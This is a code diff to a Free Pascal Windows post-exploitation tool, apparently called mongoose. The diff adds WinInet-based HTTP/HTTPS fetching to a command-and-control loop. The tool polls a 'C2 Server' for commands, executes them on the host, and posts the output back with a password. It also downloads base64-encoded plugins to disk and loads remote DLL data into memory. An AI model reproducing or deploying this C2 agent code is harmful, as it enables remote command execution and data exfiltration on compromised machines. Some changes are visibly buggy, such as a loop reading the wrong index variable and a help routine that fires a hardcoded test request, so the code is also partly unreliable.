@@ -39,8 +39,8 @@ uses
   cthreads,
   {$ENDIF}{$ENDIF}
   Classes, SysUtils, CustApp, WinSock, windows, process, JwaWinSvc, services,
-  strutils, FileUtil, core, base64, FPHTTPClient, jsonparser, fpjson,
-  lconvencoding, netenum, wmi, exploitchecker;
+  strutils, FileUtil, core, base64, jsonparser, fpjson,
+  lconvencoding, netenum, wmi, exploitchecker,WinInet;
 
 const
    // users privielges levels
@@ -119,7 +119,7 @@ type
     procedure Acc_BF;virtual;
     procedure ex_code;virtual;
     procedure remote_lib;virtual;
-
+   // function SSL_exfiltration(URL: string): string;
   end;
 
 
@@ -140,7 +140,7 @@ var
   ErrorMsg: String;
 begin
   // quick check parameters
-  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
+  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote ssl', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
   if ErrorMsg<>'' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -253,11 +253,13 @@ begin
    end;
    temp.Free;
  end;
+{* Revoked
 function fetchplugin(path:string):string;
 var
   FPHTTPClient: TFPHTTPClient;
   Resultget : string;
 begin
+InitSSLInterface;
 FPHTTPClient := TFPHTTPClient.Create(nil);
 FPHTTPClient.AllowRedirect := True;
    try
@@ -270,8 +272,8 @@ FPHTTPClient.AllowRedirect := True;
    end;
 FPHTTPClient.Free;
 
-
 end;
+ }
 function Base64Tofile(const AFile, Base64: String): Boolean;
 var
   MS: TMemoryStream;
@@ -291,7 +293,44 @@ begin
   end;
 end;
 
+function GetWebPage(const Url: string): string;
+var
+  NetHandle: HINTERNET;
+  UrlHandle: HINTERNET;
+  Buffer: array[0..1023] of Byte;
+  BytesRead: dWord;
+  StrBuffer: UTF8String;
+begin
+  Result := '';
+  BytesRead := Default(dWord);
+  NetHandle := InternetOpen('Mozilla/5.0(compatible; WinInet)', INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
 
+  // NetHandle valid?
+  if Assigned(NetHandle) then
+    Try
+      UrlHandle := InternetOpenUrl(NetHandle, PChar(Url), nil, 0, INTERNET_FLAG_RELOAD, 0);
+
+      // UrlHandle valid?
+      if Assigned(UrlHandle) then
+        Try
+          repeat
+            InternetReadFile(UrlHandle, @Buffer, SizeOf(Buffer), BytesRead);
+            SetString(StrBuffer, PAnsiChar(@Buffer[0]), BytesRead);
+            Result := Result + StrBuffer;
+          until BytesRead = 0;
+        Finally
+          InternetCloseHandle(UrlHandle);
+        end
+      // o/w UrlHandle invalid
+      else
+        writeln('Cannot open URL: ' + Url);
+    Finally
+      InternetCloseHandle(NetHandle);
+    end
+  // NetHandle invalid
+  else
+    raise Exception.Create('Unable to initialize WinInet');
+end;
 
 function splitter(cmd:AnsiString):string;
 var
@@ -324,12 +363,15 @@ begin
  end;
  procedure Tmongoose.http_cmdlet;
  var
-  prv_command,host,nxt_command:string;
+  prv_command,host,nxt_command,auth:string;
   outdata:string;
   i:integer;
-  isokay:boolean;
+  isokay,ssl_enabled:boolean;
+  payload:ansistring;
  begin
+
    isokay := false;
+   ssl_enabled := false;
    //idea of connecting into CMMLET API and retrieve commands to be executed
   // the output of data will be transfered into customized category
     for i := 1 to paramcount do begin
@@ -338,24 +380,48 @@ begin
         host := paramstr(i+1);
         isokay := true;
       end;
+      if (paramstr(i)='-x') then begin
+        auth := paramstr(i+1);
+      end;
+      if (paramstr(i) = '-ssl') then begin
+        ssl_enabled := true;
+      end;
+
 
     end;
    writeln('[^]Connecting to server...');
-   prv_command := fetchplugin('http://'+host+DEF_PORT+'/api/getcommands'); //fetch first command from node js
+   if (ssl_enabled) then
+   prv_command := GetWebPage('https://'+host+DEF_PORT+'/api/getcommands') //fetch first command from node js
+    else
+    prv_command := GetWebPage('http://'+host+DEF_PORT+'/api/getcommands'); //fetch first command from node js
+
    if prv_command > '0' then begin
    writeln('[>]Connected to C2 Server..Ready');
    outdata := runit(prv_command);   //run and exeucte the code
    writeln(outdata); //write output into terminal
-   sendcm(outdata);
 
-   while isokay do begin   // loop for newer commands
-   nxt_command := fetchplugin('http://'+host+DEF_PORT+'/api/getcommands'); //check again for commands api changes
+  payload :='username=admin&password='+auth+'&command_output='+outdata;
+  if (ssl_enabled) then
+  request(host,payload,'/api/cmd_commands',true)
+  else
+   request(host,payload,'/api/cmd_commands',false);
+
+  while isokay do begin // loop for newer commands
+     if (ssl_enabled) then
+   nxt_command := GetWebPage('https://'+host+DEF_PORT+'/api/getcommands') //check again for commands api changes
+     else
+     nxt_command := GetWebPage('http://'+host+DEF_PORT+'/api/getcommands'); //check again for commands api changes
+
    if prv_command <> nxt_command then begin  // if first command different from newer one then run newer command
 
    outdata := runit(nxt_command); //execute the newer command
    writeln(outdata);  //write data into terminal
-    sendcm(outdata);
-   prv_command:=nxt_command;  // make previous command equal to newer command , conditional state
+  if (ssl_enabled) then
+  request(host,payload,'/api/cmd_commands',true)
+  else
+   request(host,payload,'/api/cmd_commands',false);
+
+  prv_command:=nxt_command;  // make previous command equal to newer command , conditional state
    writeln('[!] waiting another command , CTRL+C to Exit');
    sleep(2000);    //sleep before execution to avoid termination
 
@@ -373,18 +439,27 @@ begin
 
  procedure Tmongoose.clinterface;
  var
-   jData : TJSONData;
-    jObject : TJSONObject;
-    jArray : TJSONArray;
-     SubObj:TJSONObject;
+  jData : TJSONData;
+  jObject : TJSONObject;
+  jArray : TJSONArray;
+  SubObj:TJSONObject;
   cmd,ip,plugindata,s,id,param,j: string;
-  i,l:integer;
-current_arch:string;
-list:Tstringlist;
+  i,l,p:integer;
+  current_arch:string;
+  list:Tstringlist;
+  ssl_enabled : boolean;
 
  begin
- list := Tstringlist.Create;
-  current_arch :='x86';   // targeted arch
+  ssl_enabled := false;
+
+   for p := 1 to paramcount do begin
+
+      if(paramstr(i)='-ssl') then begin
+         writeln('[+] SSL is enabled ');
+         ssl_enabled := true;
+      end;
+      end;
+  list := Tstringlist.Create;
   writeln ('[!] Starting interactive Console ...');
   writeln ('[+] available commands : fetch ');
   WriteLn(Output, '[*] plugins cli > ');
@@ -395,8 +470,12 @@ list:Tstringlist;
   writeln (output,'[*] set SRVRHOST ');
    ReadLn(Input,ip);
   writeln('[+] Fetching plugins metadata');
-  j := fetchplugin('http://'+ip+DEF_PORT+'/plugins/plugins.json');//WILL LOAD PLUGIN JSON METADATA FROM NODEJS
- // writeln(j);
+
+  if (ssl_enabled) then
+  j := GetWebpage('https://'+ip+DEF_PORT+'/plugins/plugins.json') //WILL LOAD PLUGIN JSON METADATA FROM NODEJS
+ else
+  j := GetWebpage('http://'+ip+DEF_PORT+'/plugins/plugins.json'); //WILL LOAD PLUGIN JSON METADATA FROM NODEJS
+
   jData := GetJSON(j);
   s := jData.AsJSON;
   s := jData.FormatJSON;
@@ -420,7 +499,11 @@ list:Tstringlist;
       begin
 
   writeln('[>] downloading plugin '+cmd+'.....');   //communicate into node js to fetch base64 file and decode it
-  plugindata := fetchplugin('http://'+ip+DEF_PORT+'/plugins/'+cmd);
+
+  if (ssl_enabled) then
+  plugindata := GetWebpage('https://'+ip+DEF_PORT+'/plugins/'+cmd)
+  else
+  plugindata := GetWebpage('http://'+ip+DEF_PORT+'/plugins/'+cmd);
 
  // getting remote plugin and save it into disk
   base64tofile(getcurrentdir+'\'+cmd+'.plg',plugindata);
@@ -439,7 +522,9 @@ list:Tstringlist;
  end;
   end;
    end;
-  //win sock functions
+
+
+//win sock functions
 
 function SendBuf(s : TSocket; var Buffer; Len : Integer) : Integer;
 begin
@@ -729,7 +814,7 @@ for i := 0 to paramcount do begin
  end;
 
    if ParamCount > 1 then begin
-dll_data := fetchplugin(remote_addr);
+dll_data := GetWebPage(remote_addr);
 
 AMemStr := TMemoryStream.Create;
 AmemStr.Write(dll_data[1],length(dll_data) * sizeof(dll_data[1]));
@@ -1274,7 +1359,13 @@ begin
 end;
 
 procedure Tmongoose.WriteHelp;
+var
+ payload: ansistring;
+   host:string;
 begin
+  host := 'localhost';
+  payload :='username=admin&password=0xsp&command_output=testdata';
+  request(host,payload,'/api/cmd_commands',false);
   { add your help code here }
   writeln('Usage: ', ExeName, ' -h');
 
